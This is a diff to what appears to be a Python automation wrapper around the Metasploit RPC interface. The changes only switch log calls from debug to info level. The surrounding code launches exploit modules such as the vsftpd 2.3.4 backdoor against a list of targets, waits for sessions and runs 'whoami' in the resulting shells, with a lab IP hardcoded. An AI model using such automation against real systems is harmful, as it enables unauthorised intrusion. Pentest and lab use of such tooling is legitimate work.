@@ -12,7 +12,7 @@ requests.packages.urllib3.disable_warnings()
 
 
 logging.basicConfig(
-    level=logging.DEBUG,
+    level=logging.INFO,
     format='%(levelname)s [%(asctime)s] %(filename)s:%(lineno)d - %(message)s',
     datefmt='%Y-%m-%d %H:%M:%S'
 )
@@ -116,7 +116,7 @@ class Console:
         return self.rpc.call('job.info',[id])
 
     def search_module(self, module_name):
-        logging.debug(f"searching for module -> {module_name}")
+        logging.info(f"searching for module -> {module_name}")
         return self.client.modules.search(module_name)
 
     def is_valid_module(self, module_name):
@@ -124,7 +124,7 @@ class Console:
         modules_data = self.search_module(module_name)
         for module in modules_data:
             if module_name == module['fullname']: 
-                logging.debug(f"valid module selected -> {module['fullname']}")
+                logging.info(f"valid module selected -> {module['fullname']}")
                 Console.validate_modules.append(module["fullname"])
                 return True
         logging.error(f"invalid module selected -> {module_name}")
@@ -142,7 +142,7 @@ class Console:
             self.exploit[argument] = arguments[argument]
 
     def get_session_id(self, ip):
-        logging.debug(f"current sessions data -> {self.client.sessions.list}")
+        logging.info(f"current sessions data -> {self.client.sessions.list}")
         for id in self.client.sessions.list.keys():
             if self.client.sessions.list[id]["session_host"] == ip:
                 return id
@@ -172,10 +172,10 @@ class Console:
             self.set_arguments(arguments)
             # session_id = await self.run_payload(shell, target)
             tasks.append(self.run_payload(shell, target))
-            logging.debug(f"payload sent for -> {target}") 
+            logging.info(f"payload sent for -> {target}") 
         results = await asyncio.gather(*tasks)
         for result in results:
-            logging.debug(result)
+            logging.info(result)
 
     async def run_payload(self, shell_path, ip):
         if self.exploit is None: return
@@ -189,7 +189,7 @@ class Console:
         exploit_result["ip"] = ip
         completed = False
         while not completed:
-            logging.debug(f"checking status for job -> {exploit_result['job_id']}")
+            logging.info(f"checking status for job -> {exploit_result['job_id']}")
             completed, session_id = await self.is_job_completed(ip)
             await asyncio.sleep(1)
 
@@ -199,24 +199,24 @@ class Console:
         return session_id
 
     async def interact(self, session_id, command, ip):
-        logging.debug("trying to interact: " + str(session_id))
-        logging.debug(type(session_id))
+        logging.info("trying to interact: " + str(session_id))
+        logging.info(type(session_id))
         client = MsfRpcClient('yourpassword',ssl=True)
         session_id = session_id
         for id in client.sessions.list.keys():
             if client.sessions.list[id]["session_host"] == ip:
                 session_id = id  
         shell = client.sessions.session(session_id)
-        logging.debug(shell)
-        logging.debug(shell.write(command))
-        logging.debug(shell.read())
-        logging.debug(self.rpc.call("session.list"))
+        logging.info(shell)
+        logging.info(shell.write(command))
+        logging.info(shell.read())
+        logging.info(self.rpc.call("session.list"))
         
     def get_sessions(self):
         return self.client.sessions.list
     
     async def exploit_test(self, ip, path):
-        logging.debug("before: "+str(self.client.sessions.list))
+        logging.info("before: "+str(self.client.sessions.list))
         #exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
         self.set_payload(path)
         # self.set_payload('exploit/linux/postgres/postgres_payload')
@@ -226,7 +226,7 @@ class Console:
         #exploit_result = exploit.execute(payload='cmd/unix/interact')
         session_id = await self.run_payload('cmd/unix/interact',ip)
         if session_id is None: return
-        logging.debug("after: "+str(self.client.sessions.list))
+        logging.info("after: "+str(self.client.sessions.list))
         await self.interact(session_id, "whoami",ip)
         # print(client.sessions.list)
         # shell = client.sessions.session('1')
@@ -234,7 +234,7 @@ class Console:
         # print(shell.read())
 
     async def test(self):
-        logging.debug("before: "+str(self.client.sessions.list))
+        logging.info("before: "+str(self.client.sessions.list))
         #exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
         self.set_payload('exploit/unix/ftp/vsftpd_234_backdoor')
         # self.set_payload('exploit/linux/postgres/postgres_payload')
@@ -244,12 +244,12 @@ class Console:
         #exploit_result = exploit.execute(payload='cmd/unix/interact')
         session_id = await self.run_payload('cmd/unix/interact',"192.168.17.130")
         if session_id is None: return
-        logging.debug("after: "+str(self.client.sessions.list))
+        logging.info("after: "+str(self.client.sessions.list))
         await self.interact(session_id, "whoami","192.168.17.130")
         await asyncio.sleep(5)
-        logging.debug("wait done")
+        logging.info("wait done")
         await self.interact(session_id, "whoami","192.168.17.130")
-        logging.debug("payload completd job is done bye")
+        logging.info("payload completd job is done bye")
         # print(client.sessions.list)
         # shell = client.sessions.session('1')
         # shell.write('whoami')
@@ -300,7 +300,7 @@ class Target:
         exploit_result["ip"] = self.ip
         completed = False
         while not completed:
-            logging.debug(f"checking status for job -> {exploit_result['job_id']}")
+            logging.info(f"checking status for job -> {exploit_result['job_id']}")
             completed, session_id = await self.is_job_completed(self.ip)
             await asyncio.sleep(1)
 
@@ -312,9 +312,9 @@ class Target:
     async def is_job_completed(self, ip):
         sessions_data = self.rpc.call("session.list")
         jobs_data = self.rpc.call("job.list")
-        logging.debug(self.exploit_result)
-        logging.debug(sessions_data)
-        logging.debug(jobs_data)
+        logging.info(self.exploit_result)
+        logging.info(sessions_data)
+        logging.info(jobs_data)
         job_lookup = self.exploit_result
         lookup_id = job_lookup["job_id"]
         lookup_uuid = job_lookup["uuid"]
@@ -332,11 +332,11 @@ class Target:
                 is_session = True
                 break
         if is_job and not is_session:
-            logging.debug("job is still running")
+            logging.info("job is still running")
             return (False, None)
         if (not is_job and is_session) or (is_job and is_session):
-            logging.debug("job completed and a session was created")
-            logging.debug(f"sesion_id -> {session_id}")
+            logging.info("job completed and a session was created")
+            logging.info(f"sesion_id -> {session_id}")
             return (True, session_id)
         if not is_job and not is_session:
             logging.warning("job completed but no session was created")
